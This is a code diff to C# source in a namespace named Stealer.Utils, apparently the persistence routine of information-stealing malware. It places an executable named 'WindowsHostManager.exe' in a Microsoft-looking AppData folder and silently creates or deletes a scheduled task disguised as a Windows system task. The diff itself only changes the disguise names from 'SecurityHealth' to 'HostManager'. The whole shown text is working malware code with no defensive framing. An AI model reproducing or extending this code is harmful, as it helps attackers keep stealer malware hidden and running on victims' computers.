@@ -10,14 +10,13 @@ namespace Stealer.Utils
         private static readonly string ExeName = "WindowsHostManager.exe";
         private static readonly string InstallDir = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-            "Microsoft", "SecurityHealth");
+            "Microsoft", "HostManager");
         private static readonly string InstallPath = Path.Combine(InstallDir, ExeName);
 
         public static void Install()
         {
             try
             {
-                Config.Initialize();
                 string methods = Config.Persistence.ToLower();
                 if (string.IsNullOrEmpty(methods) || methods == "none") return;
 
@@ -53,7 +52,7 @@ namespace Stealer.Utils
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "schtasks",
-                    Arguments = "/Delete /TN \"Microsoft\\Windows\\SecurityHealth\\Service\" /F",
+                    Arguments = "/Delete /TN \"Microsoft\\Windows\\HostManager\\Service\" /F",
                     CreateNoWindow = true,
                     UseShellExecute = false
                 })?.WaitForExit(5000);
@@ -108,7 +107,7 @@ namespace Stealer.Utils
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = "schtasks",
-                    Arguments = "/Create /TN \"Microsoft\\Windows\\SecurityHealth\\Service\" /XML \"" + xmlPath + "\" /F",
+                    Arguments = "/Create /TN \"Microsoft\\Windows\\HostManager\\Service\" /XML \"" + xmlPath + "\" /F",
                     CreateNoWindow = true,
                     UseShellExecute = false
                 })?.WaitForExit(5000);
